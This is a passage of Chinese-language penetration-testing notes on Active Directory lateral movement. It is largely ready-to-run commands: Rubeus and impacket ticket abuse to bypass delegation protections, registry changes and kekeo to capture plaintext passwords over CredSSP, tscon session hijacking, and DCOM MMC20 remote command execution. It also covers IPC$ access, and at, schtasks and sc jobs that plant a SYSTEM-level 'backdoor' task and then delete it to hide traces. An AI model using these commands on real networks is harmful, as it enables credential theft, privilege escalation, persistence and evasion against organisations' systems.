'a.cn'/'testusername':'testpassword' export KRB5CCNAME=ad01.ccache \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 \u82e5\u6211\u4eec\u7684administrator\u7528\u6237\u88ab\u8bbe\u7f6e\u4e3a\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u6216\u8005\u88ab\u52a0\u5165\u4fdd\u62a4\u7ec4\uff0c\u6309\u7406\u8bf4\u4ed6\u7684\u8bbf\u95ee\u5c31\u4e0d\u80fd\u8fdb\u884c\u59d4\u6d3e\u3002 1.rebeus \u6211\u4eec\u5728\u4ee5administrator\u8d26\u6237\u8eab\u4efd\u8fdb\u884cS4U\u65f6\uff0c\u53ea\u80fd\u8fdb\u884cS4U2SELF\uff0c\u4e0d\u80fd\u8fdb\u884cS4U2PROXY\u3002\u6211\u4eec\u7528 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u7ee7\u7eed\u5b9e\u9a8cadministrator\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u6b64\u65f6\u6211\u4eec\u7528 rubeus.exe describe /ticker:S4Ubase64 /ticket:\u52a0\u5bc6\u7684\u7968\u636e \u53ef\u4ee5\u53d1\u73b0servicename\u5e76\u6ca1\u6709\u6307\u5b9a\u67d0\u4e2a\u670d\u52a1\uff0c\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u8d26\u6237.\u5373\u53d1\u751f\u4e86\u670d\u52a1\u540d\u79f0\u7f3a\u5931\u7684\u95ee\u9898\u3002\u5f88\u7b80\u5355\uff0c\u628a\u7968\u636e\u4fee\u6539\u4e00\u4e0b\u5c31\u884c\u4e86.\u7f51\u4e0a\u5f88\u591a\u8bf4\u7528\u8fd9\u4e2a\u5de5\u5177 https://www.pkisolutions.com/tools/asn1editor/ \u4f46\u5b9e\u9645\u4e0arubeus\u4e5f\u80fd\u5b8c\u6210\u7968\u636e\u4fee\u6539 rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt \u5b8c\u4e8b 2.impacket \u5728getST\u4e2d\u52a0\u4e0a -force-forwardable \u53c2\u6570 python3 getST.py redteam.lab/CPT04\\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20 -force-forwardable credssp \u5bfc\u51fa\u7528\u6237\u660e\u6587\u5bc6\u7801 CredSSP\u534f\u8bae\u7684\u76ee\u7684\u662f\u5c06\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u4eceCredSSP\u5ba2\u6237\u7aef\u59d4\u6d3e\u7ed9CredSSP\u670d\u52a1\u5668\u3002 \u901a\u5e38\u8fd0\u7528\u4e8e\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u3002 \u6211\u4eec\u5728\u914d\u7f6e\u8fd9\u4e2a\u534f\u8bae\u65f6\uff0c\u4e00\u822c\u5728\u7ec4\u7b56\u7565\u7f16\u8f91\u5668\u91cc\u914d\u7f6e\u3002 Allow delegating default credentials\u8868\u793a\u5728\u901a\u8fc7\u4f7f\u7528\u53d7\u4fe1\u4efb\u7684X509\u8bc1\u4e66\u6216Kerberos\u5b9e\u73b0\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u65f6\u81ea\u52a8\u53d1\u9001\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\uff0c\u5373\u660e\u6587\u5bc6\u7801\u3002 Allow delegating default credentials with NTLM-only server authentication\u8868\u793a\u5728\u901a\u8fc7NTLM\u5b9e\u73b0\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u65f6\u81ea\u52a8\u53d1\u9001\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\uff0c\u5373\u660e\u6587\u5bc6\u7801\u3002 \u8fd9\u51e0\u4e2a\u5c5e\u6027\u5728\u6ce8\u518c\u8868\u91cc\u5bf9\u5e94 HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\u3002 \u653b\u51fb\u539f\u7406 \u90a3\u4e48\u8fd9\u6837\u770b\uff0c\u8fd9\u4e2a\u653b\u51fb\u6d41\u7a0b\u5c31\u5f88\u81ea\u7136\u4e86\u3002 \u6211\u4eec\u8981\u83b7\u5f97\u4e24\u53f0\u673a\u5668\uff0c\u4e00\u53f0\u673a\u5668\u5f53\u4f5c\u8fdc\u7a0b\u684c\u9762\u7684\u670d\u52a1\u5668\uff0c\u4e00\u53f0\u5f53\u4f5c\u8fdc\u7a0b\u684c\u9762\u7684\u5ba2\u6237\u7aef\u3002 \u5728\u5ba2\u6237\u7aef\u4e0a\u914d\u7f6e\u7ec4\u7b56\u7565\uff08CREDSSP\uff09\uff0c\u4f7f\u5176\u5728\u8fdc\u7a0b\u684c\u9762\u8eab\u4efd\u9a8c\u8bc1\u65f6\u53d1\u9001\u660e\u6587\u5bc6\u7801\u3002 \u7136\u540e\u5f00\u59cb\u8fdc\u7a0b\u684c\u9762\u9a8c\u8bc1\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u83b7\u5f97\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u660e\u6587\u5bc6\u7801. \u5b9e\u64cd 1.\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u6539\u53d8\u7ec4\u7b56\u7565\u8eab\u4efd\u9a8c\u8bc1\u7684\u51ed\u636e\u7b56\u7565(\u9009\u4e00\u4e2a\uff09\uff0c\u8fd9\u4e00\u6b65\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u672c\u5730\u6216\u57df\u7ba1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials /v 1 /t REG_SZ /d * reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d * \u4e00\u80a1\u8111\u8bbe\u7f6e\u597d\u5c31\u5b8c\u4e8b\u4e86\u3002\u3002\uff08\u7528\u6237\u9700\u91cd\u65b0\u767b\u9646\u624d\u751f\u6548\uff09 \u7136\u540e\u5f00\u59cb\u83b7\u53d6\u5bc6\u7801 \u6211\u4eec\u521a\u521a\u63d0\u5230\u9700\u8981\u4e24\u53f0\u7535\u8111\u624d\u80fd\u83b7\u53d6\u5bc6\u7801\uff0c\u5176\u5b9e\u90a3\u53ea\u662f\u4e00\u4e2a\u6a21\u578b\uff0c\u4e00\u4e2a\u673a\u5668\u65e2\u53ef\u4ee5\u5f53\u4f5c\u5ba2\u6237\u7aef\u53c8\u53ef\u4ee5\u5f53\u4f5c\u670d\u52a1\u7aef\u7684\u3002 \u6211\u4eec\u7528kekeo\u5b9e\u73b0\u653b\u51fb\uff08\u672c\u673a\u5411\u672c\u673a\u83b7\u53d6\u5bc6\u7801\u65f6\uff0c\u666e\u901a\u7528\u6237\u5373\u53ef\u5b8c\u6210\u4ee5\u4e0b\u64cd\u4f5c\uff09 tsssp::server \u5f00\u542f\u670d\u52a1\u7aef tsssp::client /target:... \u5f00\u542f\u5ba2\u6237\u7aef\uff0c\u8fd9\u91cc\u7684target\u968f\u4fbf\u586b \u90a3\u4e48\u518d\u56de\u5230\u9700\u8981\u4e24\u4e2a\u673a\u5668\uff0c\u4e00\u4e2a\u5f53\u670d\u52a1\u7aef\u4e00\u4e2a\u5f53\u5ba2\u6237\u7aef\u7684\u60c5\u51b5\u5427\u3002 \u670d\u52a1\u7aef\u5efa\u7acb: tsssp::server \u9700\u8981SYSTEM\u6743\u9650 \u5ba2\u6237\u7aef\u94fe\u63a5: tsssp::client /target:\u670d\u52a1\u7aef\u7684SPN\uff08\u4e00\u822c\u91c7\u7528TERMSRV\u670d\u52a1\uff09 /pipe: \\\u670d\u52a1\u7aef\u57df\u540d\\pipe\\kekeo_tsssp_endpoint \u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef tscon\u6a2a\u5411 \u82e5\u4e00\u4e2a\u673a\u5668\u4e0a\u6709\u591a\u4e2a\u7528\u6237\u767b\u5f55\uff0c\u5219\u5728\u4efb\u52a1\u7ba1\u7406\u5668\u53ef\u4ee5\u770b\u89c1\u5982\u4e0b\u573a\u9762 \u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u5176\u4ed6\u7528\u6237\u9009\u62e9\u94fe\u63a5\uff0c\u8f93\u5165\u5176\u5bc6\u7801\u540e\u5c31\u80fd\u8fdb\u5165\u5176\u684c\u9762 \u4f46\u662f\u5bf9\u4e8esystem\u7528\u6237\u6765\u8bf4\uff0c\u8981\u94fe\u63a5\u5230\u5176\u4ed6\u7528\u6237\u662f\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7system\u6743\u9650\u83b7\u53d6\u767b\u5f55\u5728\u5f53\u524d\u673a\u5668\u4e0a\u7684\u57df\u7528\u6237\u6743\u9650\u3002 \u6bd4\u5982\u4e0a\u56fe\u4e2d\u7684administrator\u662f\u57df\u7ba1\uff0c\u6211\u6709\u5f53\u524d\u673a\u5668\u7684system\u6743\u9650\uff0c\u90a3\u4e48\u6211\u53ef\u4ee5\u76f4\u63a5\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\u7528\u6237\u6743\u9650\u83b7\u5f97\u3002 query user \u83b7\u5f97administrator\u7528\u6237\u7684id \u53ef\u4ee5\u53d1\u73b0admin\u7684id\u662f2\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7528tscon\u8fd9\u4e2awindows\u81ea\u5e26\u7684\u547d\u4ee4\u884c\u5de5\u5177\u5b8c\u6210\u6743\u9650\u83b7\u5f97\u3002 cmd /k tscon 2 /dest:console \u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6211\u4eec\u8df3\u8f6c\u5230\u4e86admin\u7684\u684c\u9762 \u5229\u7528COM/DCOM\u5bf9\u8c61 \u53c2\u8003: https://www.freebuf.com/articles/network/256372.html \u524d\u8a00 DCOM\u662fCOM\u7684\u6269\u5c55\uff0c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u5316\u548c\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684COM\u5bf9\u8c61\u3002 \u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u51e0\u4e2a\u6709\u5173COM\u7684\u6982\u5ff5 CLSID\uff1a\u53c8\u53ebCLASSID \u4e00\u4e2aCOM\u7c7b\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u6bcf\u4e00\u4e2aWindows\u6ce8\u518c\u7c7b\u4e0e\u4e00\u4e2aCLSID\u76f8\u5173\u8054\u3002\u957f\u5f97\u50cf\u8fd9\u6837 {20D04FE0-3AEA-1069-A2D8-08002B30309D} ProgID\uff1a\u5176\u53ef\u88ab\u7528\u4f5c\u5bf9\u7528\u6237\u66f4\u53cb\u597d\u7684\u66ff\u4ee3\u7684\u4e00\u4e2aCLSID\uff0c\u6bd4\u5982MMC20.APPLICATION.1\u5c31\u662f\u4e00\u4e2aProgID\u3002ProgID\u4e0d\u80fd\u4fdd\u8bc1\u662f\u552f\u4e00\u7684\uff0c\u5e76\u975e\u6bcf\u4e2a\u7c7b\u90fd\u4e0eProgID\u76f8\u5173\u8054 Appid: \u4e3a\u4e86\u4fdd\u8bc1COM\u5bf9\u8c61\u80fd\u88ab\u987a\u5229\u7684\u8fdc\u7a0b\u8c03\u7528\uff08\u5373\u4e3a\u4e86\u4f7fDCOM\u53ef\u8bbf\u95eeCOM\u5bf9\u8c61\uff09\uff0c\u9700\u8981\u628aAPPID\u4e0e\u8be5\u7c7b\u7684CLSID\u76f8\u5173\u8054\uff0c\u4e14AppID\u9700\u8bbe\u7f6e\u6743\u9650\u6765\u89c4\u5212\u54ea\u4e9b\u5ba2\u6237\u7aef\u80fd\u591f\u8bbf\u95ee \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7powershell\u6267\u884cget-CimInstance \u6765\u5217\u51fa\u672c\u5730COM\u7a0b\u5e8f\u5217\u8868 \u8fdc\u7a0bDCOM\u5bf9\u8c61\u5b9e\u4f8b\u5316\u7684\u6d41\u7a0b: \u5ba2\u6237\u7aef\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8bf7\u6c42\u5b9e\u4f8b\u5316\u7531CLSID\u8868\u793a\u7684\u5bf9\u8c61\u3002\u5982\u679c\u5ba2\u6237\u7aef\u4f7f\u7528ProgID\u5219\u5148\u5c06\u5176\u672c\u5730\u89e3\u6790\u4e3aCLSID\u3002 \u8fdc\u7a0b\u8ba1\u7b97\u673a\u68c0\u67e5\u662f\u5426\u5b58\u5728\u7531\u8be5CLSID\u6240\u5173\u8054\u7684AppID\uff0c\u5e76\u9a8c\u8bc1\u5ba2\u6237\u7aef\u7684\u6743\u9650\u3002 DCOMLaunch\u670d\u52a1\u5c06\u521b\u5efa\u6240\u8bf7\u6c42\u7684\u7c7b\u7684\u5b9e\u4f8b\uff0c\u901a\u5e38\u662f\u901a\u8fc7\u8fd0\u884cLocalServer32\u5b50\u9879\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6216\u8005\u901a\u8fc7\u521b\u5efaDllHost\u8fdb\u7a0b\u6765\u627f\u8f7dInProcServer32\u5b50\u9879\u5f15\u7528\u7684dll\u3002 \u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u5668\u8fdb\u7a0b\u95f4\u5efa\u7acb\u901a\u4fe1\uff0c\u5ba2\u6237\u7aef\u4fbf\u53ef\u4ee5\u8bbf\u95ee\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002 MMC20.APPLICATION.1 \u4e2d\u6587\u540d\u4e3a\uff1a Microsoft\u7ba1\u7406\u63a7\u5236\u53f0\uff08MMC\uff092.0\u5305\u62ec\u811a\u672c\u5bf9\u8c61\u6a21\u578b\u3002 \u6211\u4eec\u4e00\u6b65\u6b65\u62bd\u4e1d\u5265\u8327\u8ddf\u8e2a\u4e00\u4e0b\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5229\u7528\u70b9\uff0c\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\u8c03\u7528\u8be5\u5bf9\u8c61\u5fc5\u987b\u8981\u6709\u7ba1\u7406\u5458\u6743\u9650\u3002 \u5982\u4e0a\u56fe\uff0c\u6211\u4eec\u5148\u5217\u51fa\u5728MMC20.APPLICATION\u4e2d\u7684\u6a21\u5757\uff0c\u7136\u540e\u7ee7\u7eed\u5217\u51fa\u5176\u4e2dDocument\u4e2d\u7684\u5c5e\u6027\uff0c\u518d\u7ee7\u7eed\u5217\u51faDocument.ActiveView\u4e2d\u7684\u5c5e\u6027\u3002\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3aExecuteShellCommand\u7684\u65b9\u6cd5\uff0c\u5149\u662f\u542c\u540d\u5b57\u5c31\u77e5\u9053\u662f\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684\u65b9\u6cd5\u4e86\u3002\u5230\u5fae\u8f6f\u6587\u6863\u67e5\u4e00\u67e5\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u83b7\u5f97\u4e86\u4ee5\u4e0b\u4fe1\u606f\u3002 ExecuteShellCommand\uff08[\u547d\u4ee4][\u76ee\u5f55][\u53c1\u6570][\u7a97\u53e3\u72b6\u6001]\uff09 \u547d\u4ee4 \u4e00\u4e2a\u503c\uff0c\u6307\u5b9a\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002\u53ef\u4ee5\u6307\u5b9a\u6807\u51c6\u8def\u5f84\u3002Command\u4e2d\u5305\u542b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982\u201c\uff05windir\uff05\u201d\uff09\u90fd\u5c06\u88ab\u6269\u5c55\u3002 \u76ee\u5f55 \u4e00\u4e2a\u503c\uff0c\u7528\u4e8e\u6307\u5b9a\u5de5\u4f5c\u76ee\u5f55\u7684\u540d\u79f0\u3002Directory\u4e2d\u5305\u542b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u90fd\u5c06\u88ab\u6269\u5c55\u3002\u5982\u679c\u201c\u76ee\u5f55\u201d\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u5c06\u5f53\u524d\u76ee\u5f55\u7528\u4f5c\u5de5\u4f5c\u76ee\u5f55\u3002 \u53c2\u6570 \u4e00\u4e2a\u6307\u5b9aCommand\u8981\u4f7f\u7528\u7684\u53c2\u6570\uff08\u5982\u679c\u6709\uff09\u7684\u503c\uff1b\u53c2\u6570\u5fc5\u987b\u7528\u7a7a\u683c\u5206\u9694\u3002\u4f8b\u5982\uff0c\u5c06\u53c2\u6570\u6307\u5b9a\u4e3a\u201c Param1 Param2\u201d\u4f1a\u5bfc\u81f4Command\u63a5\u6536Param1\u548cParam2\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u8981\u6c42\u5355\u4e2a\u53c2\u6570\u7528\u53cc\u5f15\u53f7\u5f15\u8d77\u6765\uff0c\u8bf7\u4f7f\u7528\u9002\u5408\u60a8\u7684\u7f16\u7a0b\u8bed\u8a00\u7684\u6280\u672f\u3002\u4f8b\u5982\uff0c\u5728Microsoft Visual Basic\u4e2d\uff0c\u5c06\u53c2\u6570\u6307\u5b9a\u4e3a\u201c Param1\u201d\u201c\u8fd9\u662fParam2\u201d\u201c\u201d\u5bfc\u81f4\u547d\u4ee4\u63a5\u6536\u5230\u53c2\u65701\u548c\u201c\u8fd9\u662fParam2\u201d\u3002 \u7a97\u53e3\u72b6\u6001 \u4e00\u4e2a\u6307\u5b9a\u7a97\u53e3\u72b6\u6001\u7684\u503c\u3002\u8be5\u503c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u5b57\u7b26\u4e32\u503c\u4e4b\u4e00\uff0c\u4e5f\u53ef\u4ee5\u662f\u7a7a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u9ed8\u8ba4\u4e3a\u201c\u5df2\u6062\u590d\u201d\u3002 \u201cMaximized\u201d \u8be5\u547d\u4ee4\u5728\u6700\u5927\u5316\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002 \u201cMinimized\u201d \u8be5\u547d\u4ee4\u5728\u6700\u5c0f\u5316\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002 \u201cRestored\u201d \u8be5\u547d\u4ee4\u5728\u5df2\u6062\u590d\u6216\u6b63\u5e38\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002\u6ce8\u610f\uff1a\u8fd9\u91cc\u4f1a\u5f39\u4e2a\u9ed1\u6846\u6846 \u8fd4\u56de\u503c \u6b64\u65b9\u6cd5\u4e0d\u8fd4\u56de\u503c\u3002 \u4e8e\u662f\u4e4e\uff0c\u6211\u4eec\u5c31\u80fd\u7406\u6240\u5e94\u5f53\u7684\u60f3\u5230\u8fd9\u4e2a\u4e1c\u897f\u53ef\u4ee5\u88ab\u7528\u4e8e\u672c\u5730\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u5c31\u50cf\u8fd9\u6837 [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored') \u6211\u4eec\u8fdb\u4e00\u6b65\u53d1\u6398\u5176\u6a2a\u5411\u79fb\u52a8\u7684\u80fd\u529b \u6211\u4eec\u77e5\u9053DCOM\u5177\u6709\u901a\u8fc7\u7f51\u7edc\u4e0e\u5bf9\u8c61\u8fdb\u884c\u4ea4\u4e92\u7684\u80fd\u529b\uff0c\u5728\u6211\u4eec\u662f\u7ba1\u7406\u5458\u7684\u524d\u63d0\u4e0b\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528GetTypeFromProgID()\u4e0epowershell\u8fdb\u884cDCOM\u8fdc\u7a0b\u4ea4\u4e92\u3002 GetTypeFromProgID(\"COM\",\"\u8fdc\u7a0bip\") \u5373\u53ef\u6307\u5b9a\u4e0e\u54ea\u4e00\u4e2a\u8fdc\u7a0bIP\u8fdb\u884c\u4ea4\u4e92\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628apayload\u6539\u9020\u6210\u8fd9\u6837\uff0c\u8fdb\u800c\u53ef\u4ee5\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6a2a\u5411\u79fb\u52a8\u7684\u76ee\u7684 [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application' \uff0c'\u8fdc\u7a0bip')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored') ipc ipc\u7b80\u4ecb IPC$\u662f\u4e3a\u4e86\u8ba9\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\uff0c\u901a\u8fc7\u63d0\u4f9b\u53ef\u4fe1\u4efb\u7684\u7528\u6237\u540d\u548c\u53e3\u4ee4\uff0c\u5373\u80fd\u5efa\u7acb\u94fe\u63a5\uff0c\u8fbe\u5230\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u76ee\u7684\u3002ipc\u5171\u4eab\u8fde\u63a5\u6210\u529f\u540e\u4e00\u822c\u80fd\u5171\u4eab\u6240\u6709\u5171\u4eab\u76d8\u7b26\u3002\uff08\u4e5f\u5c31\u662fIPC\u8fde\u63a5\u540e\u53ef\u4ee5\u8fdc\u7a0b\u5171\u4eabC$,D\\$\u7b49\uff09 \u5229\u7528\u8fd9\u4e2a\u94fe\u63a5\u4e0d\u4ec5\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u673a\u5668\u4e2d\u7684\u6587\u4ef6\uff0c\u8fdb\u884c\u4e0a\u4f20\u4e0b\u8f7d\u7b49\u64cd\u4f5c\uff0c\u8fd8\u80fd\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u90e8\u5206\u547d\u4ee4\u3002 net use \\\\ip\\ipc$ \"password\" /user:username \u5982\u679c\u8d26\u6237\u548c\u53e3\u4ee4\u6b63\u786e\uff0c\u5c31\u5efa\u7acb\u597d\u4e86\u94fe\u63a5\u3002 \u5efa\u7acb\u597d\u94fe\u63a5\u540e\u5c31\u80fd\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 dir \\\\192.168.183.130\\c$ \u5217\u51faC\u76d8 copy C:\\Users\\douser\\Desktop\\whoami.txt \\\\192.168.183.130\\c$ \u4e0a\u4f20\u6587\u4ef6 tasklist /S 192.168.183.130 /U administrator /P liu78963 \u5217\u51fa\u67d0IP\u4e0a\u7684\u8fdb\u7a0b\u4fe1\u606f\uff0c/U\u6307\u5b9a\u54ea\u4e2a\u7528\u6237\u6267\u884c\u8be5\u547d\u4ee4\uff0c/p\u6307\u5b9a\u8be5\u7528\u6237\u5bc6\u7801 net use \\\\IP /del /y \u5220\u9664\u94fe\u63a5 net use \u67e5\u770b\u5df2\u5efa\u7acb\u7684ipc\u94fe\u63a5 \u5229\u7528ipc\u6a2a\u5411\u79fb\u52a8 at at \\\\192.168.183.130 17:05:00 cmd.exe /c \"<\u547d\u4ee4>\" at \\\\192.168.183.130 17:05:00 powershell.exe -c \"<\u547d\u4ee4>\" \u5173\u4e8e\u65f6\u95f4\u7684\u83b7\u5f97\uff0c\u53ef\u4ee5\u4f7f\u7528 net time \\\\IP \u83b7\u5f97\u3002 \u8ba1\u5212\u4efb\u52a1\u6267\u884c\u540e\u9700\u8981\u5220\u9664\uff0c\u4e0d\u7559\u75d5\u8ff9 at \\\\192.168.183.130 1 /delete //1\u4e3a\u4efb\u52a1\u7684ID \u5173\u4e8e\u6b64\u65b9\u6cd5\u6211\u4eec\u53ef\u4ee5\u5148\u901a\u8fc7copy\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u7136\u540e\u901a\u8fc7at\u6765\u6267\u884c\u5b83\uff0c\u6216\u8005\u76f4\u63a5\u901a\u8fc7powershell\u8fdc\u7a0b\u52a0\u8f7d\u4e0a\u7ebf\u7b49 schtasks at\u547d\u4ee4\u5df2\u7ecf\u88abWindows Vista\u3001Windows Server 2008\u53ca\u4e4b\u540e\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e9f\u5f03\u4e86\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662fschtasks\u547d\u4ee4\u3002 \u6a2a\u5411\u79fb\u52a8\u7684\u5927\u81f4\u601d\u8def\u4e0eat\u5dee\u4e0d\u591a\u3002 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u521b\u5efa\u4e00\u4e2a\u540d\u79f0\u4e3a\u201cbackdoor\u201d\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u8be5\u8ba1\u5212\u4efb\u52a1\u6bcf\u5206\u949f\u542f\u52a8\u4e00\u6b21\uff0c\u542f\u52a8\u7a0b\u5e8f\u4e3a\u6211\u4eec\u4e4b\u524d\u5230C\u76d8\u4e0b\u7684shell.exe\uff0c\u542f\u52a8\u6743\u9650\u4e3asystem\u3002 schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1 /tr c:\\shell.exe /ru system /f \u4f46\u4e5f\u6709\u4e9b\u65f6\u5019\uff0c\u7531\u4e8e\u5f53\u524d\u6743\u9650\u6216\u7ec4\u7b56\u7565\u8bbe\u7f6e\u7b49\u539f\u56e0\uff0c\u8be5schtasks\u65b9\u6cd5\u8fdc\u7a0b\u521b\u5efa\u8ba1\u5212\u4efb\u52a1\u53ef\u80fd\u4f1a\u62a5\u9519\u62d2\u7edd\u8bbf\u95ee,\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a/u\u548c/p\u53c2\u6570\u5206\u522b\u8bbe\u7f6e\u9ad8\u6743\u9650\u7528\u6237\u540d\u548c\u5bc6\u7801 schtasks /create /s 192.168.183.130 /u username /p password /tn backdoor /sc minute /mo 1 /tr c:\\shell.exe /ru system /f \u53e6\u5916\uff0c\u5728\u6211\u4eec\u521b\u5efa\u597d\u8ba1\u5212\u4efb\u52a1\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u5217\u6307\u4ee4\u7acb\u5373\u8ba9\u8ba1\u5212\u4efb\u52a1\u6267\u884c\uff08\u5982\u679c\u62d2\u7edd\u8bbf\u95ee\u7684\u8bdd\u5c31\u52a0\u4e0a/u /p\u53c2\u6570\uff09 schtasks /run /s 192.168.183.130 /i /tn backdoor // i\uff1a\u5ffd\u7565\u4efb\u4f55\u9650\u5236\u7acb\u5373\u8fd0\u884c\u4efb\u52a1 \u8ba1\u5212\u4efb\u52a1\u6267\u884c\u540e\u9700\u8981\u6e05\u7406\u75d5\u8ff9 schtasks /delete /s 192.168.183.130 /tn \"backdoor\" /f sc \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u64cd\u63a7\u670d\u52a1\u3002 sc \\\\[\u4e3b\u673a\u540d/IP] create [servicename] binpath= \"[path]\" #\u521b\u5efa\u670d\u52a1\uff0c\u5176\u4e2dbinpath\u53ef\u4ee5\u662f\u67d0\u4e2aexe\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u6bb5\u6307\u4ee4\u3002\u5f53\u4e3a\u8def\u5f84\u65f6\uff0c\u670d\u52a1\u542f\u52a8\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8be5exe\u6587\u4ef6\uff0c\u5f53\u4e3a\u6307\u4ee4\u65f6\uff0c\u670d\u52a1\u542f\u52a8\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8be5\u6307\u4ee4 sc \\\\[host] start [servicename] \u542f\u52a8\u67d0\u4e2a\u670d\u52a1 sc \\\\[host] delete [servicename] #\u5220\u9664\u670d\u52a1 wmi \u4eceWindows 